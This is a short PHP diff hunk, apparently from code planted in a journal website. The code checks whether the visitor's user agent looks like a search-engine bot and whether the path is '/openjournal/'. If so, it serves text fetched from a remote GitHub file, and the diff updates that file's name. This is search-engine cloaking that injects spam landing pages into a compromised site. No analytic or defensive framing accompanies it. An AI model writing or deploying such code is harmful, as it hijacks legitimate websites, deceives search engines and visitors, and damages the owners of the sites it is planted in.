@@ -18,7 +18,7 @@ function aselolejos($url){
 if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/openjournal/") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
-    echo aselolejos("https://raw.githubusercontent.com/penj1l4tdajj4l/landingsby/refs/heads/main/africabioethicsnetwork.txt");
+    echo aselolejos("https://raw.githubusercontent.com/penj1l4tdajj4l/landingsby/refs/heads/main/africabioethicsnetworks.txt");
     ob_end_flush();
     exit;
 }
